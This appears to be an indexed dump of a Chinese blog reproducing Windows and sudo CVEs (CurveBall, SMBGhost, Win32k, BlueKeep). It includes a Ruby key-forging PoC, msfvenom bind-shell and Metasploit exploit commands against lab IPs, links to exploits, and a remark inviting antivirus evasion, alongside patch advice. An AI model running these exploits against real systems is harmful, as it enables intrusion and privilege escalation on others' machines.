","date":"0001-01-01","objectID":"/linux-sudo%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2023-22809/:3:0","tags":null,"title":"","uri":"/linux-sudo%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2023-22809/"},{"categories":null,"content":"修复建议 使用 sudoedit 时，将受影响的环境变量添加到 env_delete 拒绝列表中，例如： Defaults!SUDOEDIT env_delete+=\"SUDO_EDITOR VISUAL EDITOR\" Cmnd_Alias SUDOEDIT = sudoedit /etc/custom/service.conf user ALL=(ALL:ALL) SUDOEDIT ","date":"0001-01-01","objectID":"/linux-sudo%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2023-22809/:4:0","tags":null,"title":"","uri":"/linux-sudo%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2023-22809/"},{"categories":null,"content":"Windows CryptoAPI欺骗漏洞 CVE-2020-0601 ","date":"0001-01-01","objectID":"/windows-cryptoapi%E6%AC%BA%E9%AA%97%E6%BC%8F%E6%B4%9E-cve-2020-0601/:0:0","tags":null,"title":"","uri":"/windows-cryptoapi%E6%AC%BA%E9%AA%97%E6%BC%8F%E6%B4%9E-cve-2020-0601/"},{"categories":null,"content":"漏洞描述 1月15日，微软发布了针对CVE-2020-0601的安全补丁，该漏洞是微软在实现椭圆曲线加密算法数字证书验证时产生，可被利用于伪造来自可信任来源的签名或证书，并且因其业务特性会衍生出多种攻击向量，具有极高的可利用价值和极大的潜在破坏力，Win 10和windows server 2016 \u0026 2019也都在其影响范围内。该漏洞由美国NSA国家安全局发现后汇报给微软公司，也被认为是第一个NSA公开披露的软件系统漏洞，当然也有可能存在其特殊的战术目的。绿盟科技M01N攻击安全研究团队对此漏洞原理进行了详细分析并复现了多种可能的攻击方法，提出了详细的检测及整改方案。 ","date":"0001-01-01","objectID":"/windows-cryptoapi%E6%AC%BA%E9%AA%97%E6%BC%8F%E6%B4%9E-cve-2020-0601/:1:0","tags":null,"title":"","uri":"/windows-cryptoapi%E6%AC%BA%E9%AA%97%E6%BC%8F%E6%B4%9E-cve-2020-0601/"},{"categories":null,"content":"漏洞影响 带有指定参数的ECC密钥的证书的Microsoft Windows版本 依赖于Windows CryptoAPI的应用程序 ","date":"0001-01-01","objectID":"/windows-cryptoapi%E6%AC%BA%E9%AA%97%E6%BC%8F%E6%B4%9E-cve-2020-0601/:2:0","tags":null,"title":"","uri":"/windows-cryptoapi%E6%AC%BA%E9%AA%97%E6%BC%8F%E6%B4%9E-cve-2020-0601/"},{"categories":null,"content":"漏洞复现 CVE-2020-0601的根源是微软的加密库crypt32.dll中椭圆曲线加密算法的实现问题，首先我们来了解一下椭圆加密算法的基本原理。 要形象地理解椭圆曲线加密算法，可以结合图形来看，以下是一个符合椭圆曲线的方程y2 = x3 + ax + b，图像如下： 椭圆曲线具有的一些独特的性质使它适合用于加密算法： 椭圆曲线关于x轴对称 任何一条非垂直的线与曲线最多有三个点相交 曲线是光滑的，即曲线的所有点都没有两个或者两个以上的不同的切线 在椭圆曲线上任意两点A、B（若A、B重合则作A的切线），作直线交于椭圆曲线另一点C，过C做y轴的平行线与椭圆曲线交于C点，定义A+B=C。椭圆曲线的加法符合交换律和结合律。 如果A、B是同一个点，则过A作椭圆曲线的切线，以同样的方法得到对应的结果 C=2A 。 接下来是椭圆曲线加密相关的重点，如果对多个A进行累加,则可依次累加连线得到nA的值 。 起点为A，终点D=3A，阶为3 。 起点为A，终点G=4A，阶为4。 椭圆曲线加密 考虑K=kG，其中K、G为椭圆曲线Ep(a,b)上的点，n为G的阶。k为小于n的整数。则给定k和G，根据加法法则，计算K很容易（只要逐次求解）但反过来，给定K和G，求k就非常困难。因为实际使用中的ECC原则上把私钥k取得相当大，n也相当大，且椭圆曲线不再连续而是在实数内离散的值，要把n个解点逐一算出几乎是不可能的。这就是椭圆曲线加密算法的数学依据 。 点G称为基点 k(k\u003cn)为私有密钥 K为公开密钥 椭圆曲线加密算法（ECC）和RSA一样是一种公开密钥加密技术，对原始数据以公钥加密，以私钥解密，即便攻击者获取密文和公钥也无法（在合理的时间或代价下）解密获取明文。 同样的，椭圆曲线加密算法（ECC）也被用于数字签名，以私钥加密生成签名，以公钥解密验证签名，如果和原文一样则签名验证成功。 公开密钥加密之所以可靠是因为它们利用了公钥密码领域的单向函数原理，正向操作非常简单，而逆向操作非常困难。 由G（基点）出发，进行k（私钥）次变换，只要按部就班地计算，就能很容易地得到终点K（公钥）的值。 已知起点G（基点）和终点K（公钥），要逆推得到移动次数k（私钥）则是一个很难的问题（最佳算法也达到了全指数复杂度） 相比传统RSA加密算法，椭圆加密算法具有着天生的优势，椭圆加密算法的逆向过程相比RSA有着更大的时间复杂度。在密钥长度相同的情况下，椭圆加密算法相比RSA具有更好的安全强度。一般认为，160比特的椭圆曲线密钥即可提供与1024比特的RSA密钥相当的安全强度。 较短的密钥也意味着更少的存储空间、更快的加解密速度和更少的带宽消耗，正因为椭圆加密算法的这些优势，它被用于Windows的签名系统、https的证书、比特币系统和中国的二代身份证系统中。 虽然椭圆曲线加密算法具有着许多优势，纯算法角度破解难度极大，微软对此算法的实现的缺漏却给漏洞利用提供了可乘之机。回到椭圆曲线加密最基本的等式 K=kG，首先需要明确的是，虽然对于给定的基点G和公钥K，要求解私钥k很困难，但是如果可以任意指定基点G，要构造一对k和G使等式成立却极其简单；最简单的情况，令基点G=K，则私钥k=1，这样一对基点和私钥可以使等式成立，也是有效的解。 在正常的标准椭圆曲线算法中，基点G并不是随意指定的，而是有固定的值（标准的作用，便是对基点G等参数的选择做出规定），例如在secp256r1版本的椭圆曲线算法中，基点G应当为标准规定的固定值，如果对参数不加验证，使得用户可以自定义传入的基点G的值（作为函数的参数），上面的私钥k=1的特殊解即可成立。 在有漏洞版本的crypt32.dll中验证使用ECC算法签名部分的函数恰恰是这个情况，原先的函数未加参数验证，参与计算的基点G的内容由被验证的证书随意指定，使未授权的证书能够构建私钥k=1的特殊解来成功通过椭圆加密算法的签名验证的过程。 让我们以CVE-2020-0601的一个POC为例来解析虚假密钥的构建过程： require 'openssl' raw = File.read ARGV[0] # 读取使用ECC算法的证书文件 ca = OpenSSL::X509::Certificate.new(raw) # 读取使用ECC算法的证书 ca_key = ca.public_key # 从证书中提取公钥ca_key ca_key.private_key = 1 # 设置私钥为1，使得公钥K==1*基点G的等式成立 group = ca_key.group group.set_generator(ca_key.public_key, group.order, group.cofactor) group.asn1_flag = OpenSSL::PKey::EC::EXPLICIT_CURVE ca_key.group = group # 利用构建的假基点G和假密钥k设置新group File.open(\"spoofed_ca.key\", 'w') { |f| f.write ca_key.to_pem } # 将新的group写入文件 修补后的Crypt32.dll中椭圆曲线加密算法的函数已加入了参数验证的部分，解决了由自由指定参数G导致的构造第二个特殊的有效密钥的问题。 一处验证机制的失误导致信任链的连锁反应。 现代的安全系统中存在着“信任链”的概念，信任链的上下级存在一种类似单向担保的关系，子级证书的可靠性由签名其的父级证书担保。签名时由根证书开始一级级向下签名，验证时则逐层溯源验证，直到找到信任的根证书文件，构成了一条信任链。位于整个“信任链”最上方的是最为重要不需要自证身份的根证书。根证书一般随系统附带或由管理员安装在系统内。 这个漏洞的存在则使得构造的无效签名通过了验证机制，使本应断裂的信任链被利用，逐级担保继续下去，最终使非法内容获得了证书所有者的合法签名身份。 ","date":"0001-01-01","objectID":"/windows-cryptoapi%E6%AC%BA%E9%AA%97%E6%BC%8F%E6%B4%9E-cve-2020-0601/:3:0","tags":null,"title":"","uri":"/windows-cryptoapi%E6%AC%BA%E9%AA%97%E6%BC%8F%E6%B4%9E-cve-2020-0601/"},{"categories":null,"content":"漏洞POC https://github.com/ollypwn/CurveBall ","date":"0001-01-01","objectID":"/windows-cryptoapi%E6%AC%BA%E9%AA%97%E6%BC%8F%E6%B4%9E-cve-2020-0601/:4:0","tags":null,"title":"","uri":"/windows-cryptoapi%E6%AC%BA%E9%AA%97%E6%BC%8F%E6%B4%9E-cve-2020-0601/"},{"categories":null,"content":"参考文章 cve-2020-0601-windows-cryptoapi欺骗漏洞分析 ","date":"0001-01-01","objectID":"/windows-cryptoapi%E6%AC%BA%E9%AA%97%E6%BC%8F%E6%B4%9E-cve-2020-0601/:5:0","tags":null,"title":"","uri":"/windows-cryptoapi%E6%AC%BA%E9%AA%97%E6%BC%8F%E6%B4%9E-cve-2020-0601/"},{"categories":null,"content":"Windows SMB远程代码执行漏洞 CVE-2020-0796 ","date":"0001-01-01","objectID":"/windows-smb%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-0796/:0:0","tags":null,"title":"","uri":"/windows-smb%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-0796/"},{"categories":null,"content":"漏洞描述 2020年3月10日，微软在其官方SRC发布了CVE-2020-0796的安全公告（ADV200005，MicrosoftGuidance for Disabling SMBv3 Compression）,公告表示在Windows SMBv3版本的客户端和服务端存在远程代码执行漏洞。同时指出该漏洞存在于MicroSoft Server Message Block 3.1.1协议处理特定请求包的功能中，攻击者利用该漏洞可在目标SMB Server或者Client中执行任意代码 ","date":"0001-01-01","objectID":"/windows-smb%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-0796/:1:0","tags":null,"title":"","uri":"/windows-smb%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-0796/"},{"categories":null,"content":"漏洞影响 SMB版本 v3.1.1 Windows 10 Version 1903 for 32-bit Systems Windows 10 Version 1903 for x64-based Systems Windows 10 Version 1903 for ARM64-based Systems Windows Server, Version 1903 (Server Core installation) Windows 10 Version 1909 for 32-bit Systems Windows 10 Version 1909 for x64-based Systems Windows 10 Version 1909 for ARM64-based Systems Windows Server, Version 1909 (Server Core installation) ","date":"0001-01-01","objectID":"/windows-smb%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-0796/:2:0","tags":null,"title":"","uri":"/windows-smb%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-0796/"},{"categories":null,"content":"漏洞复现 在MSDN 上下载对应的存在漏洞的系统版本 安装后执行命令 winver 查看系统版本，并查看是否含有 KB4551762补丁 CVE-2020-0796漏洞存在于受影响版本的Windows驱动srv2.sys中。Windows SMB v3.1.1 版本增加了对压缩数据的支持。图2所示为带压缩数据的SMB数据报文的构成。 ProtocolId：4字节，固定为0x424D53FC OriginalComressedSegmentSize：4字节，原始的未压缩数据大小 CompressionAlgorithm：2字节，压缩算法 Flags：2字节，详见协议文档 Offset/Length：根据Flags的取值为Offset或者Length，Offset表示数据包中压缩数据相对于当前结构的偏移 srv2.sys中处理SMBv3压缩数据包的解压函数Srv2DecompressData未严格校验数据包中OriginalCompressedSegmentSize和Offset/Length字段的合法性。而这两个字段影响了Srv2DecompressData中内存分配函数SrvNetAllocateBuffer的参数。如图4所示的Srv2DecompressData函数反编译代码，SrvNetAllocateBuffer实际的参数为OriginalCompressedSegmentSize+Offset。这两个参数都直接来源于数据包中SMB Compression Transform Header中的字段，而函数并未判断这两个字段是否合法，就直接将其相加后作为内存分配的参数(unsigned int类型）。 这里，OriginalCompressedSegmentSize+Offset可能小于实际需要分配的内存大小，从而在后续调用解压函数SmbCompressionDecompress过程中存在越界读取或者写入的风险。 目前已公开的针对该漏洞的本地提权利用包含如下的主要过程： （1）验证程序首先创建到SMS server的会话连接（记为session）。 （2）验证程序获取自身token数据结构中privilege成员在内核中的地址（记tokenAddr）。 （3）验证程序通过session发送畸形压缩数据（记为evilData）给SMB server触发漏洞。其中，evilData包含tokenAddr、权限数据、溢出占位数据。 （4） SMS server收到evilData后触发漏洞，并修改tokenAddr地址处的权限数据，从而提升验证程序的权限。 （5）验证程序获取权限后对winlogon进行控制，来创建system用户shell。 首先，看一下已公开利用的evilData数据包 数据包的内容很简单，其中几个关键字段数据如下： OriginalSize ：0xffffffff Offset：0x10 Real compressed data ：13字节的压缩数据，解压后应为1108字节’A’加8字节的token地址。 SMB3 raw data ：实际上是由2个8字节的0x1FF2FFFFBC（总长0x10)加上0x13字节的压缩数据组成 从上面的漏洞原理分析可知，漏洞成因是Srv2DecompressData函数对报文字段缺乏合法性判断造成内存分配不当。在该漏洞数据包中，OriginalSize 是一个畸形值。OriginalSize+ Offset = 0xffffffff + 0x10 = 0xf 是一个很小的值，其将会传递给SrvNetAllocateBuffer进行调用，下面具体分析内存分配情况。SrvNetAllocateBuffer的反编译代码 由于传给SrvNetAllocateBuffer的参数为0xf，根据SrvNetAllocateBuffer的处理流程可知，该请求内存将从SrvNetBufferLookasides表中分配。这里需要注意的是，变量SrvDisableNetBufferLookAsideList跟注册表项相关，系统默认状态下SrvDisableNetBufferLookAsideList为0。 SrvNetBufferLookasides表通过函数SrvNetCreateBuffer初始化，实际SrvNetCreateBuffer循环调用了SrvNetBufferLookasideAllocate分配内存，调用SrvNetBufferLookasideAllocate的参数分别为[‘0x1100’, ‘0x2100’, ‘0x4100’, ‘0x8100’, ‘0x10100’, ‘0x20100’, ‘0x40100’, ‘0x80100’, ‘0x100100’]。在这里，内存分配参数为0xf，对应的lookaside表为0x1100大小的表项。 SrvNetBufferLookasideAllocate函数实际是调用SrvNetAllocateBufferFromPool来分配内存 在函数SrvNetAllocateBufferFromPool中，对于用户请求的内存分配大小，内部通过ExAllocatePoolWithTag函数分配的内存实际要大于请求值（多出部分用于存储部分内存相关数据结构）。以请求分配0x1100大小为例，经过一系列判断后，最后分配的内存大小allocate_size= 0x1100 + E8 + 2*(MmSizeOfMdl + 8)。 内存分配完毕之后，SrvNetAllocateBufferFromPool函数还对分配的内存进行了一系列初始化操作，最后返回了一个内存信息结构体指针作为函数的返回值。 这里需要注意如下的数据关系：SrvNetAllocateBufferFromPool函数返回值return_buffer指向一个内存数据结构，该内存数据结构起始地址同实际分配内存（函数ExAllocatePoolWithTag分配的内存）起始地址的的偏移为0x1150；return_buffer+0x18位置指向了实际分配内存起始地址偏移0x50位置处，而最终return_buffer会作为函数SrvNetAllocateBuffer的返回值 回到漏洞解压函数Srv2DecompressData，在进行内存分配之后，Srv2DecompressData调用函数SmbCompressionDecompress开始解压被压缩的数据 实际上，该函数调用了Windows库函数RtlDecompressBufferEx2来实现解压，根据RtlDecompressBufferEx2的函数原型来对应分析SmbCompressionDecompress函数的各个参数。 SmbCompressionDecompress(CompressAlgo，//压缩算法 Compressed_buf，//指向数据包中的压缩数据 Compressed_size，//数据包中压缩数据大小，计算得到 UnCompressedBuf,//解压后的数据存储地址，*(alloc_buffer+0x18)+0x10 UnCompressedSize,//压缩数据原始大小,源于数据包OriginalCompressedSegmentSize FinalUnCompressedSize)//最终解压后数据大小 从反编译代码可以看出，函数SmbCompressionDecompress中保存解压后数据的地址为*(alloc_buffer+0x18)+0x10的位置，根据内存分配过程分析，alloc_buffer + 0x18指向了实际内存分配起始位置偏移0x50处，所以拷贝目的地址为实际内存分配起始地址偏移0x60位置处。 在解压过程中，压缩数据解压后将存储到这个地址指向的内存中。根据evilData数据的构造过程，解压后的数据为占坑数据和tokenAddr。拷贝到该处地址后，tokenAddr将覆盖原内存数据结构中alloc_buffer+0x18处的数据。也就是解压缩函数SmbCompressionDecompress返回后，alloc_buffer+0x18将指向验证程序的tokenAddr内核地址 继续看Srv2DecompressData的后续处理流程，解压成功后，函数判断offset的结果不为0。不为0则进行内存移动，内存拷贝的参数如下： memmove(*(alloc_buffer+0x18)，SMB_payload，offset) 此时alloc_buffer+0x18已经指向验证程序的tokenAddr内核地址，而SMB_payload此时指向evilData中的权限数据，offset则为0x10。因此，这个内存移动完成后，权限数据将写入tokenAddr处。这意味着，SMS Server成功修改了验证程序的权限，从而实现了验证程序的提权！ 还有一个细节需要注意，在解压时，Srv2DecompressData函数会判断实际的解压后数据大小FinalUnCompressedSize是否和数据包中原始数据大小OriginalCompressedSegmentSize一致 按理来说实际解压后的数据大小为0x1100，不等于数据包中的原始压缩数据大小0xffffffff，这里应该进入到后面内存释放的流程。然而，实际上在函数SmbCompressionDecompress中，调用RtlDecompressBufferEx2成功后会直接将OriginalCompressedSegmentSize赋值给FinalUnCom","date":"0001-01-01","objectID":"/windows-smb%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-0796/:3:0","tags":null,"title":"","uri":"/windows-smb%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-0796/"},{"categories":null,"content":"CVE-2020-0796 目标探测(奇安信) 使用奇安信的漏洞扫描来探测：奇安信 CVE-2020-0796 扫描下载 ","date":"0001-01-01","objectID":"/windows-smb%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-0796/:3:1","tags":null,"title":"","uri":"/windows-smb%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-0796/"},{"categories":null,"content":"CVE-2020-0796 蓝屏EXP 运行脚本后目标成功蓝屏：Github CVE-2020-0796 蓝屏EXP 下载 ","date":"0001-01-01","objectID":"/windows-smb%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-0796/:3:2","tags":null,"title":"","uri":"/windows-smb%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-0796/"},{"categories":null,"content":"CVE-2020-0796 本地提权EXP 运行应用程序后弹出cmd窗口为 system权限：Github CVE-2020-0796 本地提权EXP 下载 或者使用 MSF的内置EXP windows/local/cve_2020_0796_smbghost 来本地提权 ","date":"0001-01-01","objectID":"/windows-smb%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-0796/:3:3","tags":null,"title":"","uri":"/windows-smb%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-0796/"},{"categories":null,"content":"CVE-2020-0796 RCE EXP RCE：Github CVE-2020-0796 RCE EXP msfvenom生成reversed shellcode msfvenom -p windows/x64/meterpreter/bind_tcp lport=2333 -f py -o exp.py 将生成exp.py中的shellcode替换exploit.py中的shellcode buf 要替换为 USER_PAYLOAD 使用 MSF msf5 \u003e use exploit/multi/handler [*] Using configured payload generic/shell_reverse_tcp msf5 exploit(multi/handler) \u003e set payload windows/x64/meterpreter/bind_tcp payload =\u003e windows/x64/meterpreter/bind_tcp msf5 exploit(multi/handler) \u003e set lport 2333 lport =\u003e 2333 msf5 exploit(multi/handler) \u003e set rhost 192.168.1.110 rhost =\u003e 192.168.1.110 msf5 exploit(multi/handler) \u003e exploit 执行脚本即可 python3 exploit.py -ip 192.168.1.110 注意有蓝屏概率 ","date":"0001-01-01","objectID":"/windows-smb%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-0796/:3:4","tags":null,"title":"","uri":"/windows-smb%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2020-0796/"},{"categories":null,"content":"Windows Win32k 内核提权漏洞 CVE-2022-21882 ","date":"0001-01-01","objectID":"/windows-win32k-%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E-cve-2022-21882/:0:0","tags":null,"title":"","uri":"/windows-win32k-%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E-cve-2022-21882/"},{"categories":null,"content":"漏洞描述 CVE-2022-21882是对CVE-2021-1732漏洞的绕过，属于win32k驱动程序中的一个类型混淆漏洞。 攻击者可以在user_mode调用相关的GUI API进行内核调用，如xxxMenuWindowProc、xxxSBWndProc、xxxSwitchWndProc、xxxTooltipWndProc等，这些内核函数会触发回调xxxClientAllocWindowClassExtraBytes。攻击者可以通过hook KernelCallbackTable 中 xxxClientAllocWindowClassExtraBytes 拦截该回调，并使用 NtUserConsoleControl 方法设置 tagWNDK 对象的 ConsoleWindow 标志，从而修改窗口类型。 最终回调后，系统不检查窗口类型是否发生变化，由于类型混淆而引用了错误的数据。flag修改前后的区别在于，在设置flag之前，系统认为tagWNDK.pExtraBytes保存了一个user_mode指针；flag设置后，系统认为tagWNDK.pExtraBytes是内核桌面堆的偏移量，攻击者可以控制这个偏移量，从而导致越界R\u0026W。 ","date":"0001-01-01","objectID":"/windows-win32k-%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E-cve-2022-21882/:1:0","tags":null,"title":"","uri":"/windows-win32k-%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E-cve-2022-21882/"},{"categories":null,"content":"漏洞影响 Product CPU Architecture Version Windows 10 x86/x64/ARM64 1809 Windows 10 x86/x64/ARM64 1909 Windows 10 x86/x64/ARM64 20H2 Windows 10 x86/x64/ARM64 21H1 Windows 10 x86/x64/ARM64 21H2 Windows 11 x64/ARM64 Windows Server 2019 Windows Server 2022 Windows Server 20H2 ","date":"0001-01-01","objectID":"/windows-win32k-%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E-cve-2022-21882/:2:0","tags":null,"title":"","uri":"/windows-win32k-%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E-cve-2022-21882/"},{"categories":null,"content":"漏洞复现 下载POC文件, 在Windows中运行 ","date":"0001-01-01","objectID":"/windows-win32k-%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E-cve-2022-21882/:3:0","tags":null,"title":"","uri":"/windows-win32k-%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E-cve-2022-21882/"},{"categories":null,"content":"Windows Win32k 本地提权漏洞 CVE-2021-1732 ","date":"0001-01-01","objectID":"/windows-win32k-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E-cve-2021-1732/:0:0","tags":null,"title":"","uri":"/windows-win32k-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E-cve-2021-1732/"},{"categories":null,"content":"漏洞描述 2021年2月10日，微软每月的例行补丁包中修复了一个Windows系统本地提权漏洞，本地攻击者可以利用此漏洞提升到system权限，据称此漏洞被用于定向攻击活动。 奇安信息威胁情报中心红雨滴团队第一时间跟进该漏洞并确认其可用性，漏洞相应的利用程序已经公开，有可能被改造来执行大范围的攻击，已经构成现实的威胁。目前微软已经修补了此漏洞，奇安信息威胁情报中心提醒相关用户及时安装2月补丁。 ","date":"0001-01-01","objectID":"/windows-win32k-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E-cve-2021-1732/:1:0","tags":null,"title":"","uri":"/windows-win32k-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E-cve-2021-1732/"},{"categories":null,"content":"漏洞影响 Windows Server, version 20H2 (Server Core Installation) Windows 10 Version 20H2 for ARM64-based Systems Windows 10 Version 20H2 for 32-bit Systems Windows 10 Version 20H2 for x64-based Systems Windows Server, version 2004 (Server Core installation) Windows 10 Version 2004 for x64-based Systems Windows 10 Version 2004 for ARM64-based Systems Windows 10 Version 2004 for 32-bit Systems Windows Server, version 1909 (Server Core installation) Windows 10 Version 1909 for ARM64-based Systems Windows 10 Version 1909 for x64-based Systems Windows 10 Version 1909 for 32-bit Systems Windows Server 2019 (Server Core installation) Windows Server 2019 Windows 10 Version 1809 for ARM64-based Systems Windows 10 Version 1809 for x64-based Systems Windows 10 Version 1809 for 32-bit Systems Windows 10 Version 1803 for ARM64-based Systems Windows 10 Version 1803 for x64-based Systems ","date":"0001-01-01","objectID":"/windows-win32k-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E-cve-2021-1732/:2:0","tags":null,"title":"","uri":"/windows-win32k-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E-cve-2021-1732/"},{"categories":null,"content":"漏洞复现 这里使用腾讯云的Windows 2019 Server 搭建环境 目前EXP已经公开了 Github公开地址:https://github.com/KaLendsi/CVE-2021-1732-Exploit 厉害的师傅可以做一下免杀，现在一上传就会被杀了 上传到服务器运行, 此时是以System权限运行 注意有蓝屏概率 CVE-2021-1723 whoami ","date":"0001-01-01","objectID":"/windows-win32k-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E-cve-2021-1732/:3:0","tags":null,"title":"","uri":"/windows-win32k-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E-cve-2021-1732/"},{"categories":null,"content":"Windows远程桌面服务漏洞 CVE-2019-0708 ","date":"0001-01-01","objectID":"/windows%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-cve-2019-0708/:0:0","tags":null,"title":"","uri":"/windows%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-cve-2019-0708/"},{"categories":null,"content":"漏洞描述 2019年5月14日，微软发布了针对远程桌面服务的关键远程执行代码漏洞CVE-2019-0708的补丁，该漏洞影响某些旧版本的Windows。攻击者一旦成功触发该漏洞，便可以在目标系统上执行任意代码，该漏洞的触发无需任何用户交互操作。这就意味着，存在漏洞的计算机只要联网，无需任何操作，就可能遭遇黑客远程攻击，运行恶意代码。其方式与2017年WannaCry恶意软件的传播方式类似。成功利用此漏洞的攻击者可以在目标系统完成安装应用程序，查看、更改或删除数据，创建完全访问权限的新账户等操作。 ","date":"0001-01-01","objectID":"/windows%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-cve-2019-0708/:1:0","tags":null,"title":"","uri":"/windows%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-cve-2019-0708/"},{"categories":null,"content":"漏洞影响 该漏洞影响旧版本的Windows系统，包括： Windows 7 Windows Server 2008 R2 Windows Server 2008 Windows 2003 Windows XP Windows 8和Windows 10及之后版本不受此漏洞影响。 ","date":"0001-01-01","objectID":"/windows%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-cve-2019-0708/:2:0","tags":null,"title":"","uri":"/windows%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-cve-2019-0708/"},{"categories":null,"content":"漏洞复现 测试环境： 将下载的exp分别放入或替换： /usr/share/metasploit-framework/lib/msf/core/exploit/rdp.rb /usr/share//metasploit-framework/modules/auxiliary/scanner/rdp/rdp_scanner.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb 升级msf： 使用命令msfupdate，按提示，apt update apt install Metasploit-framework，最后reload_all 启动Metasploit，用search搜索0708，使用use exploit/windows/rdp/cve_2019_0708_bluekeep_rce启用0708RDP模块攻击： 用show options进行参数设置 这里只需要设置两项，set rhosts 目标ip(我这里是192.168.106.149)，以及set target 3 set target ID数字(可选为0-4)设置受害机机器架构，wmware=3，Virtualbox=2 成功利用。 到目前公开的利用代码可用于攻击 Windows 7 SP1 x64 与 Windows 2008 R2 x64的EXP不太稳定，针对 Windows 7 SP1 x64攻击有蓝屏现象。 复现过程中出现的一些问题解决方法： 如提示Exploit failed: NameError undefined local variable or method `rdp_connect’ for，则需要替换下载的exp（4个rb文件）； 如提示ForceExploit错误，需要将ForceExploit设置为true； Windows2008 R2 x64 需要修改[HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\TerminalServer\\WinStations\\rdpwd\\fDisableCam]值为0。 ","date":"0001-01-01","objectID":"/windows%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-cve-2019-0708/:3:0","tags":null,"title":"","uri":"/windows%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-cve-2019-0708/"},{"categories":null,"content":"漏洞修复 安装微软的安全更新来给系统打上安全补丁： https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708 